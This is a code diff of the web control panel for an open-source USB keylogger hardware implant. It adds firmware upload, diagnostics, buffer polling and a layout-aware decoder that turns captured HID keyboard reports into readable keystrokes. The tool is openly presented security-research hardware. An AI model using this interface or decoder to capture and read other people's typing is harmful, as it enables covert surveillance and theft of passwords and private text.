@@ -2,129 +2,131 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+    <meta name="color-scheme" content="light dark">
     <title>USB okhi - Open Keylogger Hardware Implant</title>
     <style>
-        :root {
-            --main-bg: #f4f4f4;
-            --card-bg: #fff;
-            --text-color: #333;
-            --heading-color: #2c3e50;
-            --link-color: #2980b9;
-            --link-hover: #3498db;
+        :root{--bg:#f5f6f8;--card:#fff;--fg:#1c2530;--muted:#69737f;--line:#e2e6ec;--accent:#2563eb;--field:#fbfcfd}
+        @media (prefers-color-scheme:dark){
+            :root{--bg:#0f1216;--card:#171b21;--fg:#e5e9ef;--muted:#939daa;--line:#252b33;--accent:#5b9dff;--field:#11151a}
         }
-        body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background-color: var(--main-bg);
-            color: var(--text-color);
-            margin: 0;
-            padding: 0;
-        }
-        h1, h2, h3 {
-            color: var(--heading-color);
-            text-align: center;
-            margin-top: 20px;
-            margin-bottom: 10px;
-        }
-        a {
-            color: var(--link-color);
-            text-decoration: none;
-        }
-        a:hover {
-            color: var(--link-hover);
-            text-decoration: underline;
-        }
-        .container {
-            max-width: 960px;
-            margin: 20px auto;
-            background: var(--card-bg);
-            padding: 20px;
-            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
-            border-radius: 8px;
-        }
-        header {
-            margin-bottom: 20px;
-        }
-        main section {
-            margin-bottom: 20px;
-        }
-        label {
-            display: block;
-            margin: 20px 0 5px;
-            font-weight: bold;
-        }
-        textarea, select {
-            width: 100%;
-            padding: 10px;
-            margin-bottom: 10px;
-            box-sizing: border-box;
-            border: 1px solid #ddd;
-            border-radius: 5px;
-            resize: none;
-        }
-        #HIDREPORTS {
-            height: 200px;
-        }
-        button {
-            display: inline-block;
-            padding: 10px 20px;
-            margin-top: 10px;
-            background: var(--link-color);
-            border: none;
-            border-radius: 5px;
-            color: #fff;
-            cursor: pointer;
-        }
-        button:hover {
-            background: var(--link-hover);
+        *{box-sizing:border-box}
+        body{margin:0;padding:0 14px 44px;background:var(--bg);color:var(--fg);
+            font:15px/1.5 -apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Ubuntu,Helvetica,Arial,sans-serif;
+            -webkit-text-size-adjust:100%}
+        .wrap{max-width:820px;margin:0 auto}
+        header{padding:26px 2px 4px;text-align:center}
+        h1{margin:0;font-size:1.15rem;font-weight:650;letter-spacing:-.01em}
+        .by{margin:6px 0 14px;font-size:.85rem;color:var(--muted)}
+        a{color:var(--accent);text-decoration:none}
+        a:hover{text-decoration:underline}
+        .badges{display:flex;flex-wrap:wrap;gap:6px;justify-content:center}
+        .badges span{padding:3px 10px;border:1px solid var(--line);border-radius:999px;
+            background:var(--card);font-size:.76rem;color:var(--muted)}
+        .badges span:empty{display:none}
+        .status{margin:12px 0;font-size:.92rem;font-weight:650;min-height:1.3em}
+        #buildinfo{margin:0;padding:10px 12px;text-align:left;overflow-x:auto;background:var(--card);
+            border:1px solid var(--line);border-radius:10px;color:var(--muted);
+            font:11px/1.5 ui-monospace,SFMono-Regular,Menlo,Consolas,monospace}
+        #buildinfo:empty{display:none}
+        .card{margin:12px 0;padding:14px;background:var(--card);border:1px solid var(--line);border-radius:12px}
+        .card>label,.card summary{font-size:.71rem;font-weight:700;letter-spacing:.09em;
+            text-transform:uppercase;color:var(--muted)}
+        .card>label{display:block;margin:0 0 9px}
+        summary{cursor:pointer;list-style:none;padding:1px 0}
+        summary::-webkit-details-marker{display:none}
+        summary::after{content:" +";font-weight:400}
+        details[open] summary::after{content:" \2212"}
+        details>*:not(summary){margin-top:9px}
+        textarea,select{width:100%;padding:10px;border:1px solid var(--line);border-radius:9px;
+            background:var(--field);color:var(--fg);font-size:16px}
+        textarea{font:12px/1.5 ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;resize:vertical;display:block}
+        select{height:44px}
+        button{width:100%;min-height:46px;padding:12px 18px;border:0;border-radius:9px;background:var(--accent);
+            color:#fff;font-size:.95rem;font-weight:650;cursor:pointer}
+        button:disabled{opacity:.5}
+        .links{display:flex;flex-wrap:wrap;gap:8px}
+        .links a{display:flex;align-items:center;min-height:40px;padding:8px 13px;border:1px solid var(--line);
+            border-radius:9px;background:var(--field);font-size:.85rem}
+        input[type=file]{width:100%;margin-bottom:10px;padding:10px;font-size:.85rem;border:1px dashed var(--line);
+            border-radius:9px;background:var(--field);color:var(--muted)}
+        .hint{margin:9px 0 0;font-size:.79rem;line-height:1.45;color:var(--muted)}
+        #otaStatus{margin-top:11px;font-size:.86rem;line-height:1.5}
+        #otaStatus:empty{display:none}
+        @media (min-width:620px){
+            body{padding:0 22px 56px}
+            h1{font-size:1.42rem}
+            button{width:auto;min-width:220px}
         }
     </style>
 </head>
 <body>
-    <div class="container">
+    <div class="wrap">
         <header>
-            <h1>USB Open Keylogger Hardware Implant by Dreg</h1>
-            <h2>
-                <a href="https://www.rootkit.es/">rootkit.es</a> - 
+            <h1>USB Open Keylogger Hardware Implant</h1>
+            <p class="by">by Dreg &middot;
+                <a href="https://www.rootkit.es/">rootkit.es</a> &middot;
                 <a href="https://github.com/therealdreg/okhi/">GitHub</a>
-            </h2>
-            <h3>
+            </p>
+            <div class="badges">
                 <span id="fwversion"></span>
                 <span id="hwversion"></span>
-            </h3>
+            </div>
+            <div class="status" id="linkstatus"></div>
+            <pre id="buildinfo"></pre>
         </header>
         <main>
-            <section>
-                <label for="keyboardType">KEYBOARD LANG</label>
+            <section class="card">
+                <label for="keyboardType">Keyboard layout</label>
                 <select id="keyboardType">
                     <option value="english" selected>english</option>
+                    <option value="spanish">spanish</option>
                 </select>
             </section>
-            <section>
-                <article>
-                    <label for="KEYS">KEYS</label>
-                    <textarea id="KEYS" rows="10" readonly></textarea>
-                </article>
+            <section class="card">
+                <label for="KEYS">Keys</label>
+                <textarea id="KEYS" rows="8" readonly></textarea>
             </section>
-            <section>
-                <article>
-                    <label for="HIDREPORTS">HID REPORTS</label>
-                    <textarea id="HIDREPORTS" rows="10" readonly></textarea>
-                </article>
+            <section class="card">
+                <label for="HIDREPORTS">HID reports</label>
+                <textarea id="HIDREPORTS" rows="10" readonly></textarea>
             </section>
-            <section>
-                <article>
-                    <label for="EspbufferData">ESP DEBUG DATA</label>
-                    <textarea id="EspbufferData" rows="10" readonly></textarea>
-                </article>
+            <section class="card">
+                <details>
+                    <summary>ESP debug data</summary>
+                    <textarea id="EspbufferData" rows="6" readonly aria-label="ESP debug data"></textarea>
+                </details>
             </section>
-            <section>
-                <article>
-                    <label for="RpbufferData">RP DEBUG DATA</label>
-                    <textarea id="RpbufferData" rows="10" readonly></textarea>
-                </article>
+            <section class="card">
+                <details>
+                    <summary>RP debug data</summary>
+                    <textarea id="RpbufferData" rows="6" readonly aria-label="RP debug data"></textarea>
+                </details>
             </section>
-            <section>
-                <button id="downloadButton">DOWNLOAD ALL DATA</button>
+            <section class="card">
+                <button id="downloadButton">Download all data</button>
+            </section>
+            <section class="card">
+                <details>
+                    <summary>Diagnostics</summary>
+                    <div class="links">
+                        <a href="/stats" target="_blank" rel="noopener">stats</a>
+                        <a href="/versions" target="_blank" rel="noopener">versions</a>
+                        <a href="/rp" target="_blank" rel="noopener">rp status</a>
+                        <a href="/esp" target="_blank" rel="noopener">esp status</a>
+                        <a href="/buffer?from=0" target="_blank" rel="noopener">raw buffer</a>
+                        <a href="/spibench?ms=3000" target="_blank" rel="noopener"
+                           title="Measures SPI throughput. Keystroke capture is suspended while it runs.">spi benchmark 3s</a>
+                    </div>
+                    <p class="hint">Raw endpoints, they open in a new tab. The benchmark suspends capture while it runs.</p>
+                </details>
+            </section>
+            <section class="card">
+                <label for="otaFile">Firmware update</label>
+                <input type="file" id="otaFile" accept=".pkg,.bin">
+                <button id="otaButton">Upload firmware</button>
+                <p class="hint">Pick the .pkg, it updates both chips. Do not power the device off during the update.</p>
+                <div id="otaStatus"></div>
             </section>
         </main>
     </div>
@@ -150,15 +152,106 @@
             element.click();
             document.body.removeChild(element);
         });
+        let otaInProgress = false;
+        function setOtaStatus(text, color) {
+            const el = document.getElementById('otaStatus');
+            if (el) {
+                el.textContent = text;
+                el.style.color = color;
+            }
+        }
+        document.getElementById('otaButton').addEventListener('click', function() {
+            if (otaInProgress) {
+                return;
+            }
+            const input = document.getElementById('otaFile');
+            const file = input && input.files && input.files[0];
+            if (!file) {
+                setOtaStatus('Pick a firmware .bin first', '#e67e22');
+                return;
+            }
+            const button = document.getElementById('otaButton');
+            otaInProgress = true;
+            button.disabled = true;
+            setOtaStatus('Uploading 0% - do not power off', '#3498db');
+            const request = new XMLHttpRequest();
+            request.open('POST', '/ota', true);
+            request.upload.onprogress = function(event) {
+                if (event.lengthComputable) {
+                    const percent = Math.floor((event.loaded / event.total) * 100);
+                    setOtaStatus('Uploading ' + percent + '% - do not power off', '#3498db');
+                }
+            };
+            request.onload = function() {
+                otaInProgress = false;
+                button.disabled = false;
+                if (request.status === 200) {
+                    setOtaStatus('Update accepted, the device is rebooting. Reconnect to the WiFi network and reload this page to confirm it. If you do not, it rolls back to the previous firmware in 5 minutes.', '#2ecc71');
+                } else {
+                    setOtaStatus('Rejected: ' + request.responseText.trim(), '#e74c3c');
+                }
+            };
+            request.onerror = function() {
+                otaInProgress = false;
+                button.disabled = false;
+                setOtaStatus('Upload failed, the connection dropped. The old firmware is still running, nothing was damaged.', '#e74c3c');
+            };
+            request.send(file);
+        });
+        function parseKeyValues(text) {
+            const out = {};
+            text.split('\n').forEach(function(line) {
+                const sep = line.indexOf('=');
+                if (sep > 0) {
+                    out[line.slice(0, sep)] = line.slice(sep + 1).trim();
+                }
+            });
+            return out;
+        }
+        function getVersions() {
+            fetch('/versions', { cache: 'no-store' })
+                .then(response => response.text())
+                .then(text => {
+                    const v = parseKeyValues(text);
+                    const el = document.getElementById('buildinfo');
+                    if (!el) {
+                        return;
+                    }
+                    const espLine = 'ESP  v' + (v.esp_version || '?') + '  ' + (v.esp_build || '?') +
+                        '  [' + (v.esp_variant || '?') + ', ' + (v.esp_partition || '?') +
+                        ', idf ' + (v.esp_idf || '?') + ']';
+                    const rpLine = 'RP   ' + (v.rp_identity ? v.rp_identity : 'NO LINK to the RP') +
+                        (v.rp_hardware ? '  [hw ' + v.rp_hardware + ']' : '');
+                    let statusLine = '';
+                    if (v.link === 'protocol mismatch') {
+                        statusLine = '\nSPI PROTOCOL MISMATCH: esp speaks v' + v.esp_proto +
+                            ', rp speaks v' + v.rp_proto + ' - reflash the older side';
+                    } else if (v.link === 'stale') {
+                        statusLine = '\nSPI LINK STALE: the rp stopped polling - check the cable or power cycle';
+                    } else if (v.link === 'no rp seen') {
+                        statusLine = '\nNO SPI LINK: the esp has never seen a frame from the rp';
+                    } else if (v.rp_variant && v.esp_variant && v.rp_variant !== v.esp_variant) {
+                        statusLine = '\nVARIANT MISMATCH: the esp runs ' + v.esp_variant +
+                            ' firmware and the rp runs ' + v.rp_variant + ' - one of them is the wrong build';
+                    }
+                    el.textContent = espLine + '\n' + rpLine + statusLine;
+                })
+                .catch(error => {
+                    console.error('Could not read the version info, retrying...', error);
+                });
+        }
         function getFirmVersion() {
             fetch('/ver')
                 .then(response => response.text())
                 .then(version => {
-                    const fwEl = document.getElementById('fwversion');
-                    fwEl.textContent = "Firmware v" + version;
+                    if (version.trim() === '') {
+                        setTimeout(getFirmVersion, 2000);
+                        return;
+                    }
+                    document.getElementById('fwversion').textContent = "Firmware v" + version;
                 })
                 .catch(error => {
-                    console.error('Error al obtener la FW versión, reintentando...', error);
+                    console.error('Could not read the firmware version, retrying...', error);
                     setTimeout(getFirmVersion, 4000);
                 });
         }
@@ -166,15 +259,21 @@
             fetch('/hwver')
                 .then(response => response.text())
                 .then(version => {
-                    const hwEl = document.getElementById('hwversion');
-                    hwEl.textContent = "Hardware " + version;
+                    if (version.trim() === '') {
+                        setTimeout(getHwVersion, 2000);
+                        return;
+                    }
+                    document.getElementById('hwversion').textContent = "Hardware " + version;
                 })
                 .catch(error => {
-                    console.error('Error al obtener la HW versión, reintentando...', error);
+                    console.error('Could not read the hardware version, retrying...', error);
                     setTimeout(getHwVersion, 4500);
                 });
         }
         function fetchEsp() {
+            if (otaInProgress) {
+                return;
+            }
             fetch('/esp')
             .then(response => response.text())
             .then(data => {
@@ -188,6 +287,9 @@
             });
         }
         function fetchRp() {
+            if (otaInProgress) {
+                return;
+            }
             fetch('/rp')
             .then(response => response.text())
             .then(data => {
@@ -211,75 +313,240 @@
             });
             return resultado.join("");
         }
-        function fetchBuffer() {
-            console.log('Fetching buffer');
-            fetch('/buffer')
-                .then(response => response.text())
-                .then(data => {
-                    console.log('Buffer data:', data);
-                    if (data.trim() !== '') {
-                        const data_cop = String(data);
-                        document.getElementById('HIDREPORTS').value += formatData(data_cop);
-                        let parsed = parseKeyboardHID(data_cop);
-                        if (parsed.trim() !== '') {
-                            document.getElementById('KEYS').value += parsed;
+        let bufferCursor = 0;
+        let bufferBusy = false;
+        let bufferDropped = 0;
+        let bufferFirstPoll = true;
+        function showLinkStatus(head, online) {
+            const el = document.getElementById('linkstatus');
+            if (!el) {
+                return;
+            }
+            if (!online) {
+                el.textContent = 'link down';
+                el.style.color = '#e67e22';
+                return;
+            }
+            if (bufferDropped > 0) {
+                el.textContent = head + ' reports captured - ' + bufferDropped + ' DROPPED';
+                el.style.color = '#e74c3c';
+            } else {
+                el.textContent = head + ' reports captured - none lost';
+                el.style.color = '#2ecc71';
+            }
+        }
+        function appendBufferData(data) {
+            if (data.trim() === '') {
+                return;
+            }
+            document.getElementById('HIDREPORTS').value += formatData(data);
+            const parsed = parseKeyboardHID(data);
+            if (parsed.trim() !== '') {
+                document.getElementById('KEYS').value += parsed;
+            }
+        }
+        async function fetchBuffer() {
+            if (bufferBusy || otaInProgress) {
+                return;
+            }
+            bufferBusy = true;
+            try {
+                for (let pass = 0; pass < 16; pass++) {
+                    const response = await fetch('/buffer?from=' + bufferCursor, { cache: 'no-store' });
+                    const next = response.headers.get('X-Okhi-Next');
+                    const head = response.headers.get('X-Okhi-Head');
+                    const skipped = response.headers.get('X-Okhi-Skipped');
+                    if (skipped !== null && !bufferFirstPoll) {
+                        var lost = parseInt(skipped, 10);
+                        if (lost > 0) {
+                            bufferDropped += lost;
+                            // Reports are missing. Held-key state cannot survive the
+                            // gap without inventing key-down edges that never happened.
+                            resetKeyDecoder();
                         }
                     }
-                })
-                .catch(error => {
-                    console.error('Error fetching buffer:', error);
-                });
+                    bufferFirstPoll = false;
+                    showLinkStatus(head === null ? 0 : parseInt(head, 10), true);
+                    if (next !== null) {
+                        bufferCursor = parseInt(next, 10);
+                    }
+                    if (response.status !== 200) {
+                        break;
+                    }
+                    appendBufferData(String(await response.text()));
+                    if (head === null || next === null || parseInt(next, 10) >= parseInt(head, 10)) {
+                        break;
+                    }
+                }
+            } catch (error) {
+                console.error('Error fetching buffer:', error);
+                showLinkStatus(0, false);
+            } finally {
+                bufferBusy = false;
+            }
         }
-        function parseKeyboardHID(data) {
-            console.log('Parsing buffer data');
-            var lines = data.split('\n');
-            var output = '';
-            for (var line of lines) {
-                var parts = line.trim().split(' ');
-                if (parts.length < 2) continue;
-                if (parts[0] === "IN:") {
-                    parts.shift();
+        // HID usage IDs are physical key positions, not characters: the layout is what
+        // turns a position into a character, which is exactly what differs between
+        // english and spanish. Letters (4..29) are derived, everything else is a table.
+        var KEY_NAMES = {
+            40: '[ENTER]', 41: '[ESC]', 42: '[BACKSPACE]', 43: '[TAB]', 44: '[SPACE]',
+            57: '[CAPSLOCK]', 73: '[INSERT]', 74: '[HOME]', 75: '[PGUP]', 76: '[DELETE]',
+            77: '[END]', 78: '[PGDN]', 79: '[RIGHT]', 80: '[LEFT]', 81: '[DOWN]', 82: '[UP]',
+            58: '[F1]', 59: '[F2]', 60: '[F3]', 61: '[F4]', 62: '[F5]', 63: '[F6]',
+            64: '[F7]', 65: '[F8]', 66: '[F9]', 67: '[F10]', 68: '[F11]', 69: '[F12]'
+        };
+        var LAYOUTS = {
+            english: {
+                base: {
+                    30: '1', 31: '2', 32: '3', 33: '4', 34: '5', 35: '6', 36: '7', 37: '8', 38: '9', 39: '0',
+                    45: '-', 46: '=', 47: '[', 48: ']', 49: '\\', 51: ';', 52: '\'', 53: '`',
+                    54: ',', 55: '.', 56: '/', 100: '\\'
+                },
+                shift: {
+                    30: '!', 31: '@', 32: '#', 33: '$', 34: '%', 35: '^', 36: '&', 37: '*', 38: '(', 39: ')',
+                    45: '_', 46: '+', 47: '{', 48: '}', 49: '|', 51: ':', 52: '"', 53: '~',
+                    54: '<', 55: '>', 56: '?', 100: '|'
+                },
+                altgr: {}
+            },
+            spanish: {
+                base: {
+                    30: '1', 31: '2', 32: '3', 33: '4', 34: '5', 35: '6', 36: '7', 37: '8', 38: '9', 39: '0',
+                    45: '\'', 46: '¡', 47: '`', 48: '+', 49: 'ç', 51: 'ñ', 52: '´',
+                    53: 'º', 54: ',', 55: '.', 56: '-', 100: '<'
+                },
+                shift: {
+                    30: '!', 31: '"', 32: '·', 33: '$', 34: '%', 35: '&', 36: '/', 37: '(', 38: ')', 39: '=',
+                    45: '?', 46: '¿', 47: '^', 48: '*', 49: 'Ç', 51: 'Ñ', 52: '¨',
+                    53: 'ª', 54: ';', 55: ':', 56: '_', 100: '>'
+                },
+                altgr: {
+                    8: '€', 30: '|', 31: '@', 32: '#', 33: '~', 34: '€', 35: '¬',
+                    47: '[', 48: ']', 49: '}', 53: '\\'
                 }
-                if (parts[0].includes('/')) {
-                    parts[0] = parts[0].split('/')[0];
+            }
+        };
+        var currentLayout = 'english';
+        // The RP forwards EVERY 8 byte IN DATA packet on the bus, formatted by
+        // firmware/usb/rp/okhi.c as
+        //
+        //     IN: <a>/<e> <b0> <b1> <b2> <b3> <b4> <b5> <b6> <b7>;
+        //
+        // where b0..b7 are the USB HID boot keyboard report: b0 is the modifier
+        // bitmap, b1 is reserved, b2..b7 are up to six simultaneously held keys.
+        // The <a>/<e> tag carries no extra information, the firmware derives it by
+        // reinterpreting b0 and b1, so it cannot be used to tell devices apart.
+        //
+        // Enumeration and descriptor transfers are also 8 byte IN packets, which is
+        // why every report is validated before a single character is emitted.
+        var hidPrevKeys = [];
+        function resetKeyDecoder() {
+            hidPrevKeys = [];
+        }
+        function hidReportIsPlausible(b) {
+            // The reserved byte is always zero in a boot report.
+            if (b[1] !== 0) {
+                return false;
+            }
+            var ended = false;
+            for (var i = 2; i < 8; i++) {
+                var k = b[i];
+                if (k === 0) {
+                    // Real reports pack held keys from the first slot with no holes,
+                    // so a used slot after an empty one means this is not a report.
+                    ended = true;
+                    continue;
                 }
-                var mod = parseInt(parts[0], 16);
-                if (!isNaN(mod)) {
-                    if (mod & 0x01) output += '[CTRL]';
-                    if (mod & 0x10) output += '[RCTRL]';
-                    if (mod & 0x02) output += '[SHIFT]';
-                    if (mod & 0x04) output += '[ALT]';
-                    if (mod & 0x40) output += '[ALTGR]';
+                if (ended) {
+                    return false;
                 }
-                for (var i = 1; i < parts.length; i++) {
-                    var keyHex = parts[i];
-                    if (keyHex !== '0x0') {
-                        var keycode = parseInt(keyHex, 16);
-                        if (keycode) {
-                            var char = keycodeToChar(keycode);
-                            if (char) output += char;
-                        }
+                // 0x01..0x03 are the rollover and POST error codes, and 0xE0..0xE7
+                // are the modifier usages, which never appear in the key array.
+                if (k < 0x04 || k >= 0xE0) {
+                    return false;
+                }
+                for (var j = 2; j < i; j++) {
+                    if (b[j] === k) {
+                        return false;
                     }
                 }
             }
-            return output.trim();
+            return true;
         }
-        function keycodeToChar(keycode) {
-            var map = {
-                4: 'a',  5: 'b',  6: 'c',  7: 'd',  8: 'e',  9: 'f',
-                10: 'g', 11: 'h', 12: 'i', 13: 'j', 14: 'k', 15: 'l',
-                16: 'm', 17: 'n', 18: 'o', 19: 'p', 20: 'q', 21: 'r',
-                22: 's', 23: 't', 24: 'u', 25: 'v', 26: 'w', 27: 'x',
-                28: 'y', 29: 'z', 30: '1', 31: '2', 32: '3', 33: '4',
-                34: '5', 35: '6', 36: '7', 37: '8', 38: '9', 39: '0',
-                40: '[ENTER]', 42: '[BACKSPACE]', 44: '[SPACE]', 57: '[CAPSLOCK]'
-            };
-            return map[keycode];
+        function parseKeyboardHID(data) {
+            var lines = data.split('\n');
+            var output = '';
+            for (var line of lines) {
+                var parts = line.trim().split(/\s+/);
+                if (parts[0] === 'IN:') {
+                    parts.shift();
+                }
+                // the address tag plus the eight report bytes
+                if (parts.length < 9 || parts[0].indexOf('/') < 0) {
+                    continue;
+                }
+                var b = [];
+                for (var i = 1; i <= 8; i++) {
+                    b.push(parseInt(parts[i].replace(';', ''), 16));
+                }
+                if (b.some(isNaN) || !hidReportIsPlausible(b)) {
+                    continue;
+                }
+                var mod = b[0];
+                // bit 1 = left shift, bit 5 = right shift, bit 6 = right alt (AltGr).
+                // Shift and AltGr select the character instead of being reported.
+                var shift = (mod & 0x22) !== 0;
+                var altgr = (mod & 0x40) !== 0;
+                var prefix = '';
+                if (mod & 0x11) prefix += '[CTRL]';
+                if (mod & 0x04) prefix += '[ALT]';
+                if (mod & 0x88) prefix += '[GUI]';
+                var keys = [];
+                for (var i = 2; i < 8; i++) {
+                    if (b[i] !== 0) {
+                        keys.push(b[i]);
+                    }
+                }
+                // A held key is repeated in every report until it is let go, so a
+                // character is emitted only on the edge where a key first appears.
+                for (var i = 0; i < keys.length; i++) {
+                    if (hidPrevKeys.indexOf(keys[i]) >= 0) {
+                        continue;
+                    }
+                    var char = keycodeToChar(keys[i], shift, altgr);
+                    if (char) {
+                        output += prefix + char;
+                    }
+                }
+                hidPrevKeys = keys;
+            }
+            return output;
+        }
+        function keycodeToChar(keycode, shift, altgr) {
+            var layout = LAYOUTS[currentLayout] || LAYOUTS.english;
+            if (altgr && layout.altgr[keycode] !== undefined) {
+                return layout.altgr[keycode];
+            }
+            if (keycode >= 4 && keycode <= 29) {
+                var letter = String.fromCharCode(97 + keycode - 4);
+                return shift ? letter.toUpperCase() : letter;
+            }
+            var table = shift ? layout.shift : layout.base;
+            if (table[keycode] !== undefined) {
+                return table[keycode];
+            }
+            return KEY_NAMES[keycode];
         }
         document.addEventListener("DOMContentLoaded", function() {
-            setTimeout(getFirmVersion, 2000);
-            setTimeout(getHwVersion, 2500);
-            setInterval(fetchBuffer, 1000);
+            document.getElementById('keyboardType').addEventListener('change', function(event) {
+                currentLayout = event.target.value;
+            });
+            fetchBuffer();
+            getVersions();
+            setTimeout(getFirmVersion, 300);
+            setTimeout(getHwVersion, 900);
+            setInterval(getVersions, 10000);
+            setInterval(fetchBuffer, 800);
             setInterval(fetchEsp, 2400);
             setInterval(fetchRp, 3400);
         });
